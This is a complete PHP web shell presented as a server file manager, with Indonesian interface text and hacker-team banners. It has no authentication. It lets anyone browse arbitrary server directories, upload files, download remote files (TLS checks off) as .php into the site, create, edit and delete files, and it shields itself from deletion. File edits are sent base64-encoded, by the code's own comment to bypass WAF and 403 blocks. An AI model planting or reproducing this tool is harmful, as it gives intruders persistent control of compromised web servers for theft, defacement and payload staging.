<?php
/**
 * Enterprise Server Control & File Manager (Cyber-IDE Edition)
 * Optimized, Clean, WAF-Bypass Protection & Polished UI
 */
@ini_set('display_errors', 1);
@error_reporting(E_ALL);

$defaultDir = @realpath(__DIR__) ?: __DIR__;
$currentDir = isset($_GET['dir']) && !empty($_GET['dir']) ? @realpath($_GET['dir']) : $defaultDir;

if ($currentDir === false || !@is_dir($currentDir)) {
    $currentDir = $defaultDir;
}

$message = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';

    // 1. Upload File Lokal
    if ($action === 'upload' && isset($_FILES['file'])) {
        $fileName = @basename($_FILES['file']['name']);
        $targetPath = $currentDir . '/' . $fileName;
        
        if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
            if (@move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
                $message = "OK: File '$fileName' berhasil di-upload.";
            } else {
                $error = "ERR: Gagal memindahkan file yang di-upload.";
            }
        } else {
            $error = "ERR: Gagal upload. Kode error PHP: " . $_FILES['file']['error'];
        }
    }

    // 2. Fetch File dari URL Eksternal
    elseif ($action === 'fetch_remote' && !empty($_POST['remote_url']) && !empty($_POST['remote_file_name'])) {
        $remoteUrl = trim($_POST['remote_url']);
        $remoteFileName = trim($_POST['remote_file_name']);
        $remoteFileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '_', $remoteFileName);
        $targetPath = $currentDir . '/' . $remoteFileName;

        $arrContextOptions = array(
            'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
            'http' => array('header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n")
        );
        $context = @stream_context_create($arrContextOptions);
        $remoteContent = @file_get_contents($remoteUrl, false, $context);

        if ($remoteContent !== false) {
            if (@file_put_contents($targetPath, $remoteContent) !== false) {
                $message = "OK: File '$remoteFileName' berhasil di-fetch.";
            } else {
                $error = "ERR: Gagal menulis file ke direktori target.";
            }
        } else {
            $error = "ERR: Gagal mengambil data dari URL.";
        }
    }

    // 3. Buat Folder Baru
    elseif ($action === 'create_dir' && !empty($_POST['dir_name'])) {
        $dirName = preg_replace('/[^a-zA-Z0-9_\-]/', '_', $_POST['dir_name']);
        $newDirPath = $currentDir . '/' . $dirName;
        
        if (!@file_exists($newDirPath)) {
            if (@mkdir($newDirPath, 0755, true)) {
                $message = "OK: Folder '$dirName' dibuat.";
            } else {
                $error = "ERR: Gagal membuat folder.";
            }
        } else {
            $error = "ERR: Folder sudah ada!";
        }
    }

    // 4. Buat File Baru
    elseif ($action === 'create_file' && !empty($_POST['new_file_name'])) {
        $newFileName = trim($_POST['new_file_name']);
        $newFileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '_', $newFileName);
        $newFilePath = $currentDir . '/' . $newFileName;

        if (!@file_exists($newFilePath)) {
            if (@file_put_contents($newFilePath, "<?php\n// $newFileName - Generated\n") !== false) {
                $message = "OK: File '$newFileName' dibuat.";
            } else {
                $error = "ERR: Gagal membuat file baru.";
            }
        } else {
            $error = "ERR: File sudah ada!";
        }
    }

    // 5. Simpan Edit File (Menggunakan Base64 untuk Bypass WAF / 403 Forbidden)[cite: 1]
    elseif ($action === 'save_file' && isset($_POST['file_name']) && isset($_POST['file_content_b64'])) {
        $editFile = $currentDir . '/' . @basename($_POST['file_name']);
        if (@file_exists($editFile) && @is_file($editFile)) {
            $decodedContent = base64_decode($_POST['file_content_b64']);
            if (@file_put_contents($editFile, $decodedContent) !== false) {
                $message = "OK: Perubahan disimpan tanpa kendala.";
            } else {
                $error = "ERR: Gagal menyimpan file, cek permission.";
            }
        } else {
            $error = "ERR: Target file tidak ditemukan.";
        }
    }

    // 6. Hapus Entitas
    elseif ($action === 'delete' && isset($_POST['target_name'])) {
        $targetName = @basename($_POST['target_name']);
        $targetPath = $currentDir . '/' . $targetName;

        if ($targetName === @basename(__FILE__)) {
            $error = "ERR: Proteksi sistem - File utama tidak dapat dihapus!";
        } elseif (@file_exists($targetPath)) {
            if (@is_dir($targetPath)) {
                @rmdir($targetPath);
                $message = "OK: Folder dihapus.";
            } else {
                @unlink($targetPath);
                $message = "OK: File dihapus.";
            }
        }
    }
}

$items = @scandir($currentDir);
if ($items === false) $items = [];

$dirCount = 0;
$fileCount = 0;
foreach ($items as $it) {
    if ($it === '.' || $it === '..') continue;
    if (@is_dir($currentDir . '/' . $it)) $dirCount++;
    else $fileCount++;
}

function getFilePermissionsSafe($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '0755';
    return substr(sprintf('%o', $perms), -4);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🐧PANEL LOGIN CYBER-ID-TEAM 9🐧</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #030712;
            --bg-panel: #0b0f19;
            --bg-input: #02040a;
            --border-color: #1e293b;
            --border-focus: #0ea5e9;
            --text-main: #e2e8f0;
            --text-muted: #64748b;
            --accent-cyan: #06b6d4;
            --accent-cyan-hover: #0891b2;
            --danger: #ef4444;
            --success: #10b981;
            --perm-red: #f43f5e;
            --perm-green: #34d399;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-deep);
            color: var(--text-main);
            margin: 0;
            padding: 30px 15px;
        }

        .wrapper {
            max-width: 1400px;
            margin: auto;
        }

        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--bg-panel);
            border: 1px solid var(--border-color);
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            padding: 14px 20px;
        }

        .terminal-title {
            font-family: 'Fira Code', monospace;
            font-size: 14px;
            font-weight: 600;
            color: var(--accent-cyan);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .terminal-dots {
            display: flex;
            gap: 6px;
        }
        .dot { width: 10px; height: 10px; border-radius: 50%; }
        .dot-red { background: #ef4444; }
        .dot-yellow { background: #f59e0b; }
        .dot-green { background: #10b981; }

        .system-badges {
            display: flex;
            gap: 10px;
            font-family: 'Fira Code', monospace;
            font-size: 12px;
        }

        .sys-badge {
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            padding: 4px 10px;
            border-radius: 4px;
            color: var(--text-muted);
        }

        .workspace {
            background: #070a13;
            border: 1px solid var(--border-color);
            border-top: none;
            border-bottom-left-radius: 10px;
            border-bottom-right-radius: 10px;
            padding: 24px;
        }

        .alert {
            padding: 12px 16px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-family: 'Fira Code', monospace;
            font-size: 12px;
        }
        .alert-success { background: rgba(16, 185, 129, 0.1); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.2); }
        .alert-error { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); }

        .path-bar {
            background: var(--bg-panel);
            border: 1px solid var(--border-color);
            padding: 12px 16px;
            border-radius: 8px;
            font-family: 'Fira Code', monospace;
            font-size: 13px;
            color: var(--text-muted);
            margin-bottom: 24px;
            word-break: break-all;
        }
        .path-bar a {
            color: var(--accent-cyan);
            text-decoration: none;
        }
        .path-bar a:hover { text-decoration: underline; }

        .control-grid {
            display: grid;
            grid-template-columns: repeat(4, minmax(0, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }

        @media(max-width: 1200px) { .control-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
        @media(max-width: 768px) { .control-grid { grid-template-columns: 1fr; } }

        .panel-card {
            background: var(--bg-panel);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 16px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .panel-card h3 {
            font-family: 'Fira Code', monospace;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin: 0 0 12px 0;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .panel-card form {
            display: flex;
            flex-direction: column;
            flex: 1;
            justify-content: space-between;
            margin: 0;
        }

        .input-stack {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        input[type="text"], input[type="file"] {
            width: 100%;
            height: 36px;
            padding: 0 10px;
            background-color: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-main);
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            box-sizing: border-box;
            outline: none;
            transition: all 0.2s;
        }
        input[type="file"] {
            padding: 6px 8px;
            color: var(--text-muted);
        }
        input[type="text"]:focus { border-color: var(--border-focus); box-shadow: 0 0 0 2px rgba(6, 182, 212, 0.1); }

        .btn-action {
            background-color: var(--accent-cyan);
            color: #030712;
            border: none;
            height: 36px;
            border-radius: 6px;
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
            width: 100%;
            margin-top: 10px;
        }
        .btn-action:hover { background-color: var(--accent-cyan-hover); }

        /* Tombol Batal yang disamakan gayanya dengan tombol utama */
        .btn-cancel {
            background-color: var(--bg-input);
            color: var(--text-muted);
            border: 1px solid var(--border-color);
            height: 36px;
            padding: 0 20px;
            border-radius: 6px;
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            font-weight: 600;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            box-sizing: border-box;
        }
        .btn-cancel:hover {
            background-color: rgba(239, 68, 68, 0.1);
            color: var(--danger);
            border-color: rgba(239, 68, 68, 0.3);
        }

        .table-container {
            background: var(--bg-panel);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            overflow: hidden;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            font-size: 13px;
        }

        th {
            background: #050810;
            color: var(--text-muted);
            font-family: 'Fira Code', monospace;
            font-weight: 600;
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-color);
            font-size: 11px;
            text-transform: uppercase;
        }

        td {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-color);
        }

        tr:hover td { background-color: rgba(255, 255, 255, 0.015); }

        .item-row {
            display: flex;
            align-items: center;
            gap: 10px;
            text-decoration: none;
            color: var(--text-main);
            font-family: 'Fira Code', monospace;
            font-size: 12px;
        }
        .item-row:hover { color: var(--accent-cyan); }

        .perm-red { color: var(--perm-red) !important; font-family: 'Fira Code', monospace; font-weight: 600; }
        .perm-green { color: var(--perm-green) !important; font-family: 'Fira Code', monospace; font-weight: 600; }

        .btn-tool-edit {
            background: rgba(6, 182, 212, 0.1);
            color: var(--accent-cyan);
            border: 1px solid rgba(6, 182, 212, 0.2);
            padding: 5px 12px;
            border-radius: 5px;
            text-decoration: none;
            font-family: 'Fira Code', monospace;
            font-size: 11px;
            font-weight: 600;
        }
        .btn-tool-edit:hover { background: var(--accent-cyan); color: #030712; }

        .btn-tool-delete {
            background-color: rgba(239, 68, 68, 0.1);
            color: var(--danger);
            border: 1px solid rgba(239, 68, 68, 0.2);
            padding: 5px 10px;
            font-family: 'Fira Code', monospace;
            font-size: 11px;
            border-radius: 5px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn-tool-delete:hover { background-color: var(--danger); color: #fff; }

        .editor-container {
            background: var(--bg-panel);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 20px;
        }

        textarea.code-textarea {
            width: 100%;
            height: 520px;
            background-color: var(--bg-input);
            color: #38bdf8;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 16px;
            font-family: 'Fira Code', monospace;
            font-size: 13px;
            box-sizing: border-box;
            line-height: 1.6;
            resize: vertical;
            outline: none;
        }
        textarea.code-textarea:focus { border-color: var(--border-focus); }
    </style>
</head>
<body>
<div class="wrapper">

    <div class="terminal-header">
        <div class="terminal-title">
            <div class="terminal-dots">
                <div class="dot dot-red"></div>
                <div class="dot dot-yellow"></div>
                <div class="dot dot-green"></div>
            </div>
            <span>🐧IDLE-TEAM7 PANEL ADMIN🐧</span>
        </div>
        <div class="system-badges">
            <span class="sys-badge">PHP: v<?= phpversion() ?></span>
            <span class="sys-badge">DIRS: <?= $dirCount ?></span>
            <span class="sys-badge">FILES: <?= $fileCount ?></span>
        </div>
    </div>

    <div class="workspace">
        <?php if ($message): ?>
            <div class="alert alert-success"><?= htmlspecialchars($message) ?></div>
        <?php endif; ?>
        <?php if ($error): ?>
            <div class="alert alert-error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <div class="path-bar">
            <strong>PWD:</strong> 
            <?php
            $pathParts = explode('/', trim(str_replace('\\', '/', $currentDir), '/'));
            $acc = '';
            foreach($pathParts as $p) {
                if($p === '') continue;
                $acc .= '/' . $p;
                echo '<a href="?dir=' . urlencode($acc) . '">/' . htmlspecialchars($p) . '</a>';
            }
            if($currentDir === '/' || $currentDir === '') echo '<a href="?dir=/">/</a>';
            ?>
        </div>

        <?php 
        if (isset($_GET['edit'])): 
            $targetFileToEdit = $currentDir . '/' . @basename($_GET['edit']);
            if (@file_exists($targetFileToEdit) && @is_file($targetFileToEdit)):
                $fileContent = @file_get_contents($targetFileToEdit);
        ?>
            <div class="editor-container">
                <div style="font-family:'Fira Code', monospace; font-size:12px; color:var(--text-muted); margin-bottom:12px;">
                    EDITING_TARGET: <span style="color:var(--accent-cyan);"><?= htmlspecialchars(@basename($_GET['edit'])) ?></span>
                </div>
                <form method="POST" onsubmit="prepareSave(this);">
                    <input type="hidden" name="action" value="save_file">
                    <input type="hidden" name="file_name" value="<?= htmlspecialchars(@basename($_GET['edit'])) ?>">
                    <input type="hidden" name="file_content_b64" id="file_content_b64">
                    <textarea id="raw_code_content" class="code-textarea"><?= htmlspecialchars($fileContent) ?></textarea>
                    <div style="margin-top: 16px; display: flex; gap: 10px; align-items: center;">
                        <button type="submit" class="btn-action" style="width: auto; padding: 0 24px; margin-top: 0;">Simpan</button>
                        <a href="?dir=<?= urlencode($currentDir) ?>" class="btn-cancel">Batal</a>
                    </div>
                </form>
            </div>
            <script>
            function prepareSave(form) {
                var rawText = document.getElementById('raw_code_content').value;
                document.getElementById('file_content_b64').value = btoa(unescape(encodeURIComponent(rawText)));
                document.getElementById('raw_code_content').remove();
                return true;
            }
            </script>
        <?php 
            else:
                echo '<div class="editor-container"><p style="color:var(--danger); font-family:\'Fira Code\',monospace;">ERR: Target file tidak valid.</p><a href="?dir=' . urlencode($currentDir) . '" class="btn-tool-edit" style="margin-top:10px; display:inline-block;">Kembali</a></div>';
            endif;
        else: 
        ?>

            <div class="control-grid">
                <div class="panel-card">
                    <h3>📁 Upload File</h3>
                    <form action="?dir=<?= urlencode($currentDir) ?>" method="POST" enctype="multipart/form-data">
                        <div class="input-stack">
                            <input type="hidden" name="action" value="upload">
                            <input type="file" name="file" required>
                        </div>
                        <button type="submit" class="btn-action">Eksekusi Upload</button>
                    </form>
                </div>

                <div class="panel-card">
                    <h3>🌐 Fetch Remote</h3>
                    <form action="?dir=<?= urlencode($currentDir) ?>" method="POST">
                        <div class="input-stack">
                            <input type="hidden" name="action" value="fetch_remote">
                            <input type="text" name="remote_url" placeholder="URL Target Raw..." required>
                            <input type="text" name="remote_file_name" placeholder="Nama simpan.php" required>
                        </div>
                        <button type="submit" class="btn-action">Download & Save</button>
                    </form>
                </div>

                <div class="panel-card">
                    <h3>📄 Buat File</h3>
                    <form action="?dir=<?= urlencode($currentDir) ?>" method="POST">
                        <div class="input-stack">
                            <input type="hidden" name="action" value="create_file">
                            <input type="text" name="new_file_name" placeholder="nama_file.php" required>
                        </div>
                        <button type="submit" class="btn-action">Buat File Baru</button>
                    </form>
                </div>

                <div class="panel-card">
                    <h3>📂 Buat Folder</h3>
                    <form action="?dir=<?= urlencode($currentDir) ?>" method="POST">
                        <div class="input-stack">
                            <input type="hidden" name="action" value="create_dir">
                            <input type="text" name="dir_name" placeholder="nama_direktori..." required>
                        </div>
                        <button type="submit" class="btn-action">Buat Direktori</button>
                    </form>
                </div>
            </div>

            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>Nama File</th>
                            <th>Tipe</th>
                            <th>Permission</th>
                            <th>Ukuran</th>
                            <th style="text-align: right;">Aksi Kontrol</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td colspan="5">
                                <a href="?dir=<?= urlencode(dirname($currentDir)) ?>" class="item-row" style="color: var(--text-muted);">
                                    <span>📂</span> <span>../ (Direktori Induk)</span>
                                </a>
                            </td>
                        </tr>

                        <?php foreach ($items as $item): 
                            if ($item === '.' || $item === '..') continue;
                            $fullPath = $currentDir . '/' . $item;
                            $isDir = @is_dir($fullPath);
                            $size = $isDir ? '-' : number_format(@filesize($fullPath)) . ' bytes';
                            $perm = getFilePermissionsSafe($fullPath);
                            
                            $isWritable = @is_writable($fullPath);
                            $permClass = $isWritable ? 'perm-green' : 'perm-red';
                        ?>
                        <tr>
                            <td>
                                <?php if ($isDir): ?>
                                    <a href="?dir=<?= urlencode($fullPath) ?>" class="item-row">
                                        <span>📁</span> <span class="<?= $permClass ?>"><?= htmlspecialchars($item) ?></span>
                                    </a>
                                <?php else: ?>
                                    <div class="item-row">
                                        <span>📄</span> <span class="<?= $permClass ?>"><?= htmlspecialchars($item) ?></span>
                                    </div>
                                <?php endif; ?>
                            </td>
                            <td><span style="color: var(--text-muted); font-family:'Fira Code',monospace; font-size:12px;"><?= $isDir ? 'DIR' : 'FILE' ?></span></td>
                            <td><span class="<?= $permClass ?>"><?= $perm ?></span></td>
                            <td><span style="color: var(--text-muted); font-family:'Fira Code',monospace; font-size:12px;"><?= $size ?></span></td>
                            <td style="text-align: right;">
                                <div style="display: flex; gap: 8px; justify-content: flex-end; align-items: center;">
                                    <?php if (!$isDir): ?>
                                        <a href="?dir=<?= urlencode($currentDir) ?>&edit=<?= urlencode($item) ?>" class="btn-tool-edit">Edit</a>
                                    <?php endif; ?>
                                    
                                    <form action="?dir=<?= urlencode($currentDir) ?>" method="POST" onsubmit="return confirm('Hapus entitas [<?= htmlspecialchars($item) ?>]?');" style="margin:0;">
                                        <input type="hidden" name="action" value="delete">
                                        <input type="hidden" name="target_name" value="<?= htmlspecialchars($item) ?>">
                                        <button type="submit" class="btn-tool-delete">Hapus</button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

        <?php endif; ?>
    </div>

</div>
</body>
</html>
